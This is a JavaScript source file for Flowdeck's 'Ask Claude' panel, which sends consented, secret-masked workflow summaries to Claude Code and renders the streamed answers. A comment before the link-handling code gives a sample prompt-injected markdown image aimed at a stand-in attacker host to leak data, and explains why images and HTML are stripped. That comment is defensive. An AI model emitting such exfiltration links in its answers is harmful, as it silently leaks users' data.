// Ask Claude: questions about the whole instance, one workflow, or one failure, answered by the person's own Claude
// Code with no tools. The newest answer sits right under the question box and types itself out as it streams.
// Before the first question, Flowdeck says exactly what leaves the machine and waits for a yes.

import { div } from "gpui-kit";
import { h_flex, v_flex, Textarea, TextView } from "gpui-base";
import { shared, setShared } from "herdr";
import { alpha, icon, button, chip, spinner, rise, mono, card, dot } from "./ui.js";
import { buildContext, buildPrompt, SYSTEM_PROMPT, lastMentioned, mentionsInOrder, culpritIn, safeMarkdown, answerLinkAllowed } from "./model.js";
import { MODELS, startAsk, readAsk, cancelAsk, cleanupAsk } from "./claude.js";
import { graphView, GraphState } from "./graph.js";
import { randomBytes } from "crypto";

const CONSENT = "flowdeck.ask-consent";
const MODEL = "flowdeck.ask-model";
const POLL = 160;
const MAX_MS = 4 * 60e3;
const WALK_MS = 700;

const SUGGEST = {
  all: ["What's failing most this week, and why?", "Which workflows haven't run in the last 7 days?", "Which workflows send messages to Slack or email?", "Summarise what this instance automates, in five bullets."],
  workflow: ["Explain what this workflow does, step by step.", "What are the most likely ways this breaks?", "How can I make it more robust?", "Which credentials and outside services does it depend on?"],
  failure: ["Why did this fail?", "What exactly should I change to fix it?", "How do I stop this happening again?"],
};

export class AskSession {
  constructor() {
    this.turns = [];
    this.scope = { kind: "all", label: "All workflows" };
    this.installed = null;
    this.pending = null;
    this.job = null;
    this.task = null;
    this.seq = 0;
  }

  get model() { return MODELS.some((m) => m.id === shared(MODEL)) ? shared(MODEL) : "sonnet"; }
  get busy() { return Boolean(this.job); }

  reset() {
    this.cancel();
    this.turns = [];
    this.scope = { kind: "all", label: "All workflows" };
    this.pending = null;
  }

  async cancel() {
    this.task?.cancel();
    this.task = null;
    this.walk?.cancel();
    this.walk = null;
    const job = this.job;
    this.job = null;
    if (job) {
      const t = this.turns.find((p) => p.a.job === job)?.a;
      if (t) { t.streaming = false; t.stopped = true; }
      await cancelAsk(job);
    }
  }

  // Consent is per instance and per kind of scope: saying yes for one workflow isn't saying yes to sending a summary
  // of every workflow, or to another instance.
  consented(view, scope = this.scope) {
    const all = shared(CONSENT);
    return Boolean(all && typeof all === "object" && all[view.profile?.id]?.[scope.kind === "all" ? "all" : "workflow"]);
  }

  consent(view) {
    const all = shared(CONSENT);
    const prev = all && typeof all === "object" ? all : {};
    const pid = view.profile?.id;
    setShared(CONSENT, { ...prev, [pid]: { ...(prev[pid] ?? {}), [this.scope.kind === "all" ? "all" : "workflow"]: true } });
  }

  // Exactly what would be sent for the current scope, for the preview.
  contextFor(view, scope = this.scope) {
    const m = view.derived();
    const workflow = scope.kind !== "all" ? m.byId.get(scope.workflowId) : null;
    const failure = scope.kind === "failure" ? m.groups.find((g) => g.latest && String(g.latest.id) === String(scope.runId)) ?? { latest: { id: scope.runId } } : null;
    return buildContext({ scope: workflow ? "workflow" : "all", workflows: view.data.workflows, stats: m.stats, groups: m.groups, runs: view.data.runs, workflow, failure, instance: view.profile?.name });
  }

  async ask(question, view, cx) {
    if (this.busy) return;
    if (!this.consented(view)) { this.pending = question; this.preview = null; cx.notify(); return; }
    this.pending = null;
    const id = ++this.seq;
    const scope = { ...this.scope };
    const q = { id: `q${id}`, role: "user", text: question, scope: scope.label };
    const a = { id: `a${id}`, role: "assistant", text: "", streaming: true, scope: scope.label, model: this.model, started: Date.now() };
    // Turns are question/answer pairs, newest first; Claude is given them oldest first.
    const history = this.turns.slice().reverse().flatMap((p) => [p.q, p.a]).filter((t) => !t.error && t.text);
    this.turns.unshift({ q, a });
    cx.notify();
    if (this.installed === false) {
      a.streaming = false;
      a.error = "Ask needs Claude Code. Install it (claude.com/claude-code), sign in once with `claude`, then try again.";
      cx.notify();
      return;
    }
    try {
      const context = this.contextFor(view, scope);
      a.chars = context.length;
      const job = await startAsk({ prompt: buildPrompt(context, history, question, randomBytes(6).toString("hex")), system: SYSTEM_PROMPT, model: this.model });
      a.job = job;
      this.job = job;
      a.floStep = 0;
      this.walk?.cancel();
      this.walk = cx.timer.every(WALK_MS, (cx) => {
        if (a.floStep < (a.tourLength ?? 0) - 1) { a.floStep++; cx.notify(); }
        else if (!a.streaming) { this.walk?.cancel(); this.walk = null; }
      });
      this.task = cx.timer.every(POLL, (cx) => {
        if (this.job !== job) return;
        cx.spawn(async (cx) => {
          const r = await readAsk(job);
          if (this.job !== job) return;
          a.text = r.text;
          const late = Date.now() - job.started > MAX_MS;
          if (r.done || late) {
            a.streaming = false;
            a.error = late && !r.done ? "Claude took too long to answer." : r.error;
            a.cost = r.cost;
            a.ms = Date.now() - job.started;
            this.task?.cancel();
            this.task = null;
            this.job = null;
            if (late && !r.done) await cancelAsk(job); else await cleanupAsk(job);
          }
          cx.notify();
        });
      });
    } catch (e) {
      a.streaming = false;
      a.error = String(e?.message ?? e);
      this.job = null;
      cx.notify();
    }
  }
}

function scopeBar(view, c) {
  const s = view.asking.scope, m = view.derived();
  const wf = view.sel.workflowId ? m.byId.get(view.sel.workflowId) : null;
  const set = (scope) => (_e, cx) => { view.asking.scope = scope; cx.notify(); };
  return h_flex().gap(6).items_center().flex_wrap()
    .child(div().text_size(11.5).text_color(c.dim).mr(2).child("About"))
    .child(chip(c, { id: "sc-all", label: "All workflows", iconName: "grid", active: s.kind === "all", onClick: set({ kind: "all", label: "All workflows" }) }))
    .when(Boolean(wf) && !(s.kind === "workflow" && s.workflowId === wf?.id), (e) => e.child(chip(c, { id: "sc-wf", label: wf.name.slice(0, 32), iconName: "flow", active: false, onClick: set({ kind: "workflow", workflowId: wf.id, label: wf.name }) })))
    .when(s.kind === "workflow", (e) => e.child(chip(c, { id: "sc-cur", label: s.label.slice(0, 40), iconName: "flow", active: true })))
    .when(s.kind === "failure", (e) => e.child(chip(c, { id: "sc-fail", label: s.label.slice(0, 44), iconName: "alert", color: c.err, active: true })));
}

function modelPicker(view, c) {
  const cur = view.asking.model;
  return h_flex().gap(2).p(2).rounded(8).bg(alpha(c.foreground, 0.05)).children(MODELS.map((m) => h_flex().id(`model-${m.id}`).h(24).px(9).items_center().rounded(6).cursor_pointer()
    .text_size(11.5).text_color(cur === m.id ? c.foreground : c.dim).bg(cur === m.id ? c.raised : "#00000000").tooltip(`Claude ${m.label}: ${m.note}`)
    .on_click((_e, cx) => { setShared(MODEL, m.id); cx.notify(); }).child(m.label)));
}

function consentCard(view, c) {
  const s = view.asking.scope;
  const what = s.kind === "all" ? "a summary of every workflow (names, node types, run counts and recent errors)" : `the "${s.label}" workflow: its nodes, their settings and its recent errors`;
  return card(c).id("consent").p(18).gap(12).border_color(alpha(c.brand, 0.5)).map(rise(true, 0))
    .child(h_flex().gap(10).items_center().child(icon("shield", 17, c.brand)).child(div().flex_1().min_w(0).text_size(14).font_semibold().child("Before your first question")))
    .child(div().text_size(12.8).text_color(c.foreground).child(`To answer, Flowdeck sends ${what} from ${view.profile?.name ?? "this instance"} to Claude, through your own Claude Code sign-in. You'll be asked again for other instances, and before sending a summary of every workflow.`))
    .child(v_flex().gap(6)
      .child(h_flex().gap(8).items_start().child(icon("check", 13, c.ok).mt(2)).child(div().flex_1().min_w(0).text_size(12.3).text_color(c.muted).child("Never sent: credentials, pinned data, or the items your runs processed.")))
      .child(h_flex().gap(8).items_start().child(icon("check", 13, c.ok).mt(2)).child(div().flex_1().min_w(0).text_size(12.3).text_color(c.muted).child("Fields named like secrets, and values that look like keys or tokens, are masked first.")))
      .child(h_flex().gap(8).items_start().child(icon("check", 13, c.ok).mt(2)).child(div().flex_1().min_w(0).text_size(12.3).text_color(c.muted).child("Claude runs with every tool switched off: it can read what's sent and write an answer, nothing else."))))
    .child(h_flex().gap(8).pt(2).flex_wrap()
      .child(button(c, { id: "consent-yes", label: "Ask Claude", iconName: "spark", kind: "primary", onClick: (_e, cx) => { view.asking.consent(view); const q = view.asking.pending; view.asking.pending = null; view.asking.preview = null; if (q) view.ask(q, cx); } }))
      .child(button(c, { id: "consent-see", label: view.asking.preview ? "Hide what's sent" : "See exactly what's sent", iconName: "eye", kind: "ghost", onClick: (_e, cx) => {
        view.asking.preview = view.asking.preview ? null : view.asking.contextFor(view);
        cx.notify();
      } }))
      .child(button(c, { id: "consent-no", label: "Not now", kind: "subtle", onClick: (_e, cx) => { view.asking.pending = null; view.asking.preview = null; cx.notify(); } })))
    .when(Boolean(view.asking.preview), (e) => e.child(div().id("consent-preview").max_h(260).overflow_y_scrollbar().p(10).rounded(8).bg(c.background).border(1).border_color(c.border)
      .text_size(11).font_family(mono()).text_color(c.muted).child(String(view.asking.preview).slice(0, 20000))));
}

function answer(c, t, i) {
  const md = t.text || "";
  const thinking = t.streaming && !md;
  return v_flex().id(`turn-${t.id}`).gap(10).p(16).rounded(14).bg(c.surface).border(1).border_color(t.error ? alpha(c.err, 0.4) : i === 0 && t.streaming ? alpha(c.brand, 0.5) : c.border)
    .map(rise(true, 0, 6))
    .child(h_flex().gap(9).items_center()
      .child(h_flex().size(24).rounded(7).items_center().justify_center().bg(alpha(c.brand, 0.16)).child(t.streaming ? spinner(13, c.brand) : icon("spark", 13, c.brand)))
      .child(div().text_size(12).font_semibold().child("Claude"))
      .child(div().text_size(11).text_color(c.dim).child(`${MODELS.find((m) => m.id === t.model)?.label ?? ""} · ${t.scope}`))
      .child(div().flex_1())
      .when(!t.streaming && t.ms, (e) => e.child(div().text_size(10.8).text_color(c.dim).font_family(mono()).child(`${(t.ms / 1000).toFixed(1)} s${t.cost ? ` · $${t.cost.toFixed(4)}` : ""}`))))
    .when(thinking, (e) => e.child(h_flex().gap(8).items_center().h(22)
      .child(div().text_size(12.5).text_color(c.muted).child("Reading your workflows"))
      .child(div().w(24).text_size(12.5).text_color(c.brand).frames(["·", "··", "···", " ··", "  ·", ""], 180).child(""))))
    .when(Boolean(md), (e) => e.child(TextView.markdown(`md-${t.id}`, safeMarkdown(t.streaming ? `${md} ▍` : md)).selectable(true).text_size(13).text_color(c.foreground)
      .on_link_click((url) => openSafe(url))))
    .when(Boolean(t.error), (e) => e.child(h_flex().gap(8).items_start().child(icon("alert", 13, c.err)).child(div().flex_1().text_size(12.5).text_color(c.err).child(t.error))))
    .when(Boolean(t.stopped), (e) => e.child(div().text_size(11.5).text_color(c.dim).child("Stopped.")));
}

const question = (c, t) => h_flex().id(`turn-${t.id}`).justify_end().child(div().max_w("80%").px(14).py(9).rounded(14).bg(alpha(c.brand, 0.14)).border(1).border_color(alpha(c.brand, 0.3))
  .text_size(13).text_color(c.foreground).child(t.text));

// An answer is written by a model that read untrusted workflow text. Before it's drawn, images and raw HTML go: a
// picture loads without a click, so an injected ![](https://attacker/?data=…) would be a silent leak. Code is left as
// written. Links only open to the person's own workflow and execution pages, or n8n's docs: never a webhook or form
// URL on their instance, which a click would run.
let openSafe = () => {};
const makeOpenSafe = (view) => (url) => {
  const ok = answerLinkAllowed(url, view.profile?.base);
  if (ok === "external") view.openExternal(String(url));
  else if (ok === "instance") view.openLink(String(url));
};

export function askView(view, c) {
  openSafe = makeOpenSafe(view);
  const s = view.asking, en = Boolean(view.entered.ask);
  const busy = s.busy;
  const sug = SUGGEST[s.scope.kind] ?? SUGGEST.all;
  const composer = v_flex().gap(10).p(14).rounded(14).bg(c.surface).border(1).border_color(busy ? alpha(c.brand, 0.5) : c.border).shadow_md()
    .child(scopeBar(view, c))
    .child(h_flex().gap(10).items_end()
      .child(div().id("ask-input").flex_1().min_w(0).py(4).cursor_text().on_mouse_down("left", (_e, cx) => cx.stop_propagation())
        .child(Textarea.new(view.inputs.ask).w_full().text_size(14).text_color(c.foreground)))
      .child(busy
        ? button(c, { id: "ask-stop", iconName: "stop", kind: "solid", tooltip: "Stop", onClick: (_e, cx) => cx.spawn(async (cx) => { await s.cancel(); cx.notify(); }) })
        : button(c, { id: "ask-send", iconName: "send", kind: "primary", tooltip: "Ask (Enter)", onClick: (_e, cx) => view.askCurrent(cx) })))
    .child(h_flex().justify_between().items_center().gap(10)
      .child(h_flex().gap(6).items_center().min_w(0).child(icon("lock", 11, c.dim))
        .child(div().truncate().text_size(11).text_color(c.dim).child("Sent to Claude through your Claude Code: workflow structure and errors. Never credentials or run data.")))
      .child(modelPicker(view, c)));
  const turns = s.turns;
  const focus = claudeFocus(view);
  const width = view.size?.width ?? 0;
  const side = focus && width >= 960;
  const panelW = width >= 1320 ? 440 : 360;
  return h_flex().id("ask").size_full().items_start()
    .child(v_flex().id("ask-scroll").flex_1().min_w(0).h_full().overflow_y_scrollbar().items_center()
    .child(v_flex().w_full().max_w(side ? 780 : 860).px(20).py(20).gap(14)
      .child(composer.map(rise(en, 0, 8)))
      .when(Boolean(s.pending), (e) => e.child(consentCard(view, c)))
      .when(s.installed === false, (e) => e.child(h_flex().px(12).py(9).gap(9).items_center().rounded(9).bg(alpha(c.warn, 0.1)).border(1).border_color(alpha(c.warn, 0.4))
        .child(icon("alert", 13, c.warn)).child(div().flex_1().min_w(0).text_size(12.3).child("Claude Code isn't installed here. Ask uses it to answer; everything else works without it."))))
      .when(!turns.length && !s.pending, (e) => e.child(v_flex().pt(18).gap(14).map(rise(en, 100, 8))
        .child(v_flex().items_center().gap(8)
          .child(h_flex().size(46).rounded(14).items_center().justify_center().bg(alpha(c.brand, 0.14)).child(icon("spark", 22, c.brand)))
          .child(div().text_size(16).font_semibold().child(s.scope.kind === "all" ? "Ask about your workflows" : `Ask about ${s.scope.label}`))
          .child(div().text_size(12.5).text_color(c.muted).child("Claude reads the structure and recent errors, then answers. Try one of these:")))
        .child(h_flex().flex_wrap().gap(10).justify_center().children(sug.map((q, i) => h_flex().id(`sug-${i}`).flex_1().min_w(280).px(14).py(11).gap(10).items_center().rounded(11)
          .bg(c.surface).border(1).border_color(c.border).cursor_pointer().hover((st) => st.border_color(alpha(c.brand, 0.6)).bg(c.hover))
          .map(rise(en, 160 + i * 60, 8))
          .on_click((_e, cx) => view.ask(q, cx))
          .child(icon("spark", 13, c.brand)).child(div().flex_1().min_w(0).text_size(12.8).child(q)).child(icon("chevron", 12, c.dim)))))))
      .children(turns.map((p, i) => v_flex().id(`pair-${p.q.id}`).gap(10).child(question(c, p.q)).child(answer(c, p.a, i))))
      .when(turns.length > 0 && !busy, (e) => e.child(h_flex().justify_center().pt(4).child(button(c, { id: "ask-clear", label: "Clear conversation", size: "sm", kind: "subtle", onClick: (_e, cx) => { s.turns = []; cx.notify(); } }))))))
    .when(Boolean(side), (e) => e.child(focusPanel(view, c, focus, panelW)));
}

// What Claude is looking at, worked out from the answer as it streams: the workflow it last named (or the one asked
// about), and the node of that workflow it last named. Flo stands there.
export function claudeFocus(view, onlyWorkflow = null) {
  const s = view.asking, m = view.derived();
  const a = s.turns[0]?.a;
  const text = a?.text ?? "";
  const scope = s.scope;
  let wf = scope.kind !== "all" ? m.byId.get(scope.workflowId) : null;
  if (!wf && text) {
    const name = lastMentioned(text, view.data.workflows.map((w) => w.name));
    wf = view.data.workflows.find((w) => w.name === name) ?? null;
  }
  if (!wf || !(wf.nodes ?? []).length) return null;
  if (onlyWorkflow && wf.id !== onlyWorkflow) return null;
  // Flo walks the nodes in the order Claude names them, one hop per tick of the session's walk timer, however fast
  // the text itself arrives.
  const tour = mentionsInOrder(text, wf.nodes.map((n) => n.name));
  if (a) a.tourLength = tour.length;
  let node = tour.length ? tour[Math.min(a?.floStep ?? 0, tour.length - 1)] : null;
  const failing = scope.kind === "failure" ? view.data.runs.get(String(scope.runId))?.node : null;
  const named = Boolean(node);
  node = node ?? failing ?? (wf.nodes.find((n) => /trigger|webhook/i.test(n.type)) ?? wf.nodes[0]).name;
  const walking = Boolean(a) && (a.floStep ?? 0) < tour.length - 1;
  const busy = Boolean(a?.streaming) || walking;
  // Once the answer is in and Flo has walked it, Flo goes to the node the answer blames (or, asked about a failure
  // without blaming a node, the one that failed) and raises the alarm there.
  const culprit = !busy && a && !a.error ? culpritIn(text, wf.nodes.map((n) => n.name)) ?? failing : null;
  if (culprit) node = culprit;
  const scanning = busy && named;
  const mood = busy ? (named ? "scan" : "think") : culprit ? "error" : a?.error ? "error" : !a && failing === node ? "error" : "look";
  return {
    workflow: wf, node, mood, named, streaming: busy, scan: scanning, alert: culprit, culprit,
    step: tour.length ? Math.min(a?.floStep ?? 0, tour.length - 1) + 1 : 0, steps: tour.length,
    label: culprit ? `Likely cause: ${culprit}` : scanning ? `Scanning ${node}` : `Claude's focus: ${node}`,
  };
}

function focusPanel(view, c, f, width) {
  const key = f.workflow.id;
  if (!view.askGraph || view.askGraph.key !== key) { view.askGraph = new GraphState(); view.askGraph.key = key; view.askGraph.entered = true; view.askGraph.pad = 24; }
  const graph = view.graphOf(f.workflow);
  return v_flex().id("focus-panel").w(width).flex_none().h_full().p(16).pl(0).gap(10)
    .child(card(c).id("focus-card").flex_1().min_h(0).overflow_hidden().border_color(f.streaming ? alpha(c.brand, 0.55) : c.border)
      .child(h_flex().px(14).py(10).gap(8).items_center().border_b(1).border_color(c.border)
        .child(dot(f.streaming ? c.brand : c.dim, 7, f.streaming))
        .child(div().text_size(11).font_semibold().text_color(c.dim).child("CLAUDE'S FOCUS"))
        .child(div().flex_1())
        .child(div().max_w(220).truncate().text_size(11.5).text_color(c.muted).child(f.workflow.name)))
      .child(div().relative().flex_1().min_h(0).child(graphView(c, { id: "focus-graph", graph, state: view.askGraph, run: null, replay: null, selected: f.named ? f.node : null, active: false, focus: f, follow: true,
        onSelect: (_n, cx) => cx.notify(), onChange: (cx) => cx.notify() }))))
    .child(h_flex().px(4).gap(8).items_center()
      .child(div().text_size(12).text_color(f.culprit ? c.err : c.muted).child(f.culprit ? "Likely cause" : f.streaming ? (f.named ? "Scanning" : "Reading the workflow…") : f.named ? "Last talked about" : "Ready to look at"))
      .when(f.named || !f.streaming, (e) => e.child(div().flex_1().min_w(0).truncate().text_size(12).font_semibold().text_color(c.foreground).child(f.node)))
      .when(f.steps > 1, (e) => e.child(div().flex_none().text_size(11).font_family(mono()).text_color(c.dim).child(`${f.step}/${f.steps}`))));
}

// Ask Claude docked beside a workflow's graph: the same conversation as the Ask tab, narrower, so the answer and the
// graph are on screen together. While Claude answers, Flo scans each node it names on the big graph; when it's done,
// a strip here names the likely cause, and clicking it opens that node.
export function askDock(view, c, w) {
  openSafe = makeOpenSafe(view);
  const s = view.asking, busy = s.busy;
  const f = claudeFocus(view, w.id);
  const mine = s.scope.kind !== "all" && s.scope.workflowId === w.id;
  const turns = mine ? s.turns : [];
  const sug = (SUGGEST[s.scope.kind] ?? SUGGEST.workflow).slice(0, 3);
  const status = f && (f.streaming || f.culprit)
    ? h_flex().id("dock-status").mx(12).px(11).py(8).gap(9).items_center().rounded(9)
      .bg(alpha(f.culprit ? c.err : c.run, 0.1)).border(1).border_color(alpha(f.culprit ? c.err : c.run, 0.4))
      .when(Boolean(f.culprit), (e) => e.cursor_pointer().hover((st) => st.bg(alpha(c.err, 0.16))).tooltip("Open this node")
        .on_click((_e, cx) => { view.sel.node = f.culprit; view.inspectFromDock = true; cx.notify(); }))
      .child(f.culprit ? icon("alert", 14, c.err) : spinner(13, c.run))
      .child(div().flex_none().text_size(12).text_color(c.muted).child(f.culprit ? "Likely cause" : f.named ? "Flo is scanning" : "Claude is reading"))
      .child(div().flex_1().min_w(0).truncate().text_size(12).font_semibold().text_color(f.culprit ? c.err : c.foreground).child(f.named || f.culprit ? f.node : "the workflow…"))
      .when(f.steps > 1 && !f.culprit, (e) => e.child(div().flex_none().text_size(11).font_family(mono()).text_color(c.dim).child(`${f.step}/${f.steps}`)))
      .when(Boolean(f.culprit), (e) => e.child(icon("chevron", 12, c.err)))
    : null;
  return v_flex().id("dock").w(400).flex_none().h_full().border_l(1).border_color(c.border).bg(c.surface)
    .child(h_flex().px(14).py(10).gap(9).items_center().border_b(1).border_color(c.border)
      .child(h_flex().size(26).rounded(7).items_center().justify_center().bg(alpha(c.brand, 0.16)).child(busy ? spinner(13, c.brand) : icon("spark", 13, c.brand)))
      .child(v_flex().flex_1().min_w(0)
        .child(div().text_size(13).font_semibold().child("Ask Claude"))
        .child(div().truncate().text_size(11).text_color(c.dim).child(mine ? s.scope.label : w.name)))
      .child(modelPicker(view, c))
      .child(button(c, { id: "dock-close", iconName: "close", kind: "subtle", size: "sm", tooltip: "Close", onClick: (_e, cx) => { view.dockOpen = false; cx.notify(); } })))
    .child(v_flex().p(12).gap(8)
      .child(h_flex().gap(8).items_end().p(10).rounded(11).bg(c.background).border(1).border_color(busy ? alpha(c.brand, 0.5) : c.border)
        .child(div().id("dock-input").flex_1().min_w(0).py(2).cursor_text().on_mouse_down("left", (_e, cx) => cx.stop_propagation())
          .child(Textarea.new(view.inputs.ask).w_full().text_size(13).text_color(c.foreground)))
        .child(busy
          ? button(c, { id: "dock-stop", iconName: "stop", kind: "solid", size: "sm", tooltip: "Stop", onClick: (_e, cx) => cx.spawn(async (cx) => { await s.cancel(); cx.notify(); }) })
          : button(c, { id: "dock-send", iconName: "send", kind: "primary", size: "sm", tooltip: "Ask (Enter)", onClick: (_e, cx) => view.askCurrent(cx) })))
      .child(h_flex().gap(6).items_center().child(icon("lock", 10, c.dim))
        .child(div().truncate().text_size(10.5).text_color(c.dim).child("Structure and errors only. Never credentials or run data."))))
    .when(Boolean(status), (e) => e.child(status))
    .when(Boolean(s.pending), (e) => e.child(div().px(12).pt(8).child(consentCard(view, c))))
    .child(v_flex().id("dock-scroll").flex_1().min_h(0).overflow_y_scrollbar().p(12).gap(10)
      .when(!turns.length && !s.pending, (e) => e.children(sug.map((q, i) => h_flex().id(`dsug-${i}`).px(12).py(9).gap(9).items_center().rounded(10)
        .border(1).border_color(c.border).cursor_pointer().hover((st) => st.border_color(alpha(c.brand, 0.6)).bg(c.hover))
        .on_click((_e, cx) => view.ask(q, cx))
        .child(icon("spark", 12, c.brand)).child(div().flex_1().min_w(0).text_size(12.3).child(q)))))
      .children(turns.map((p, i) => v_flex().id(`dpair-${p.q.id}`).gap(8).child(question(c, p.q)).child(answer(c, p.a, i)))));
}
